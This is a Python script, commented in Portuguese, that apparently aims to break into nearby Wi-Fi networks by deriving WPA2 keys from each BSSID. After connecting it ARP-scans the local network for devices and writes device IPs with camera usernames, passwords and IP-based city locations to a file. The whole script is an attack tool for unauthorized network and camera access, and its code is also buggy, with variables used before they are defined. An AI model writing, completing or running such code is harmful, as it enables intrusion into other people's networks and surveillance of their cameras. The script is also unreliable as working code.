import pywifi
from scapy.all import ARP, Ether, srp
import paramiko
import socket
import subprocess
import nmap
import os
import sys
import geocoder

# Função para obter o endereço IP do roteador padrão
def get_router_ip():
    process = subprocess.Popen(['ip', 'route', 'show', 'default'], stdout=subprocess.PIPE)
    output, _ = process.communicate()
    output = output.decode()
    router_ip = output.split(' ')[2]
    return router_ip

# Função para obter o nome de usuário do roteador (assumindo que seja o mesmo que o nome de usuário do sistema)
def get_router_username():
    process = subprocess.Popen(['whoami'], stdout=subprocess.PIPE)
    output, _ = process.communicate()
    router_username = output.decode().strip()
    return router_username

# Função para obter a senha do roteador (assumindo que seja a mesma senha do sistema)
def get_router_password():
    return ''

# Função para obter o endereço IP interno
def get_internal_ip():
    hostname = socket.gethostname()
    internal_ip = socket.gethostbyname(hostname)
    return internal_ip

# Função para obter a porta interna disponível
def get_internal_port():
    process = subprocess.Popen(['netstat', '-an', '-p', 'tcp'], stdout=subprocess.PIPE)
    output, _ = process.communicate()

    ports = set(range(8080, 9090))  # Intervalo de portas a serem verificadas

    for line in output.decode().split('\n'):
        parts = line.split()
        if len(parts) == 4 and parts[3] == 'LISTEN':
            _, port = parts[3].rsplit(':', 1)
            ports.discard(int(port))

    internal_port = min(ports)
    return internal_port

# Função para obter a porta da interface externa (mesma porta interna)
def get_external_interface_port():
    return get_internal_port()

# Função para obter os dispositivos conectados na rede local
def obter_dispositivos_conectados():
    arp = ARP(pdst="192.168.0.1/24")
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    pacote = ether/arp
    resultado = srp(pacote, timeout=3, verbose=0)[0]

    dispositivos = []
    for sent, received in resultado:
        dispositivos.append({'IP': received.psrc, 'MAC': received.hwsrc})

    return dispositivos

# Função para calcular a senha da rede Wi-Fi com base no BSSID
def calcular_senha(bssid):
    bssid = bssid.replace(":", "")
    bssid = bssid[2:]
    return bssid

# Função para testar as senhas de redes Wi-Fi
def testar_senhas(networks):
    for network in networks:
        senha_wifi = calcular_senha(network.bssid)

        perfil = pywifi.Profile()
        perfil.ssid = network.ssid
        perfil.auth = pywifi.const.AUTH_ALG_OPEN
        perfil.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
        perfil.cipher = pywifi.const.CIPHER_TYPE_CCMP
        perfil.key = senha_wifi

        iface.remove_all_network_profiles()
        temp_profile = iface.add_network_profile(perfil)
        iface.connect(temp_profile)

        print(f"Conectado à rede Wi-Fi: {network.ssid} - BSSID: {network.bssid} - Senha: {senha_wifi}")

        while iface.status() != pywifi.const.IFACE_CONNECTED:
            pass

        print("Conexão Wi-Fi estabelecida!")

        dispositivos_conectados = obter_dispositivos_conectados()

        print("\nDispositivos conectados na rede:")
        for dispositivo in dispositivos_conectados:
            print(f"IP: {dispositivo['IP']} - MAC: {dispositivo['MAC']}")

        # Salva o IP, usuário e senha da câmera em um arquivo
        with open("lista_cameras.txt", "a") as file:
            file.write(f"IP: {dispositivos_conectados[0]['IP']} - Usuario: {user} - Senha: {password}\n")

        print("-------------------------------------------")

# Função para obter o ponto de referência de localização com base no endereço IP
def obter_ponto_referencia(ip):
    g = geocoder.ip(ip)
    if g.ok:
        return g.city
    else:
        return ""

# Função para verificar as credenciais de acesso à câmera
def check_credentials(manufacturer, user, password):
    with open('camlist.txt', 'r') as file:
        for line in file:
            m, u, p = line.strip().split(',')
            if m == manufacturer and u == user and p == password:
                return True
    return False

# Obtém o endereço IP do roteador padrão
router_ip = get_router_ip()

# Obtém o nome de usuário do roteador
router_username = get_router_username()

# Obtém a senha do roteador
router_password = get_router_password()

# Obtém o endereço IP interno
internal_ip = get_internal_ip()

# Obtém a porta interna disponível
internal_port = get_internal_port()

# Obtém a porta da interface externa
external_interface_port = get_external_interface_port()

# Inicializa o objeto Wifi
wifi = pywifi.PyWiFi()

# Obtém a primeira interface Wi-Fi disponível
iface = wifi.interfaces()[0]

# Ativa a interface
iface.enable()

# Obtém a lista de redes Wi-Fi disponíveis
networks = []

# Loop para conectar-se a todas as redes disponíveis
while True:
    # Obtém as redes Wi-Fi disponíveis
    scan_results = iface.scan_results()

    # Itera sobre as redes disponíveis
    for network in scan_results:
        # Verifica se a rede já foi adicionada à lista
        if network not in networks:
            # Adiciona a rede à lista de redes conectadas
            networks.append(network)

    # Testa as senhas para as redes Wi-Fi
    testar_senhas(networks)

    # Atualiza a lista de câmeras no arquivo com os pontos de referência de localização
    with open("lista_cameras.txt", "a") as file:
        for dispositivo in dispositivos_conectados:
            ip = dispositivo['IP']
            ponto_referencia = obter_ponto_referencia(ip)
            file.write(f"IP: {ip} - Local: {ponto_referencia}\n")
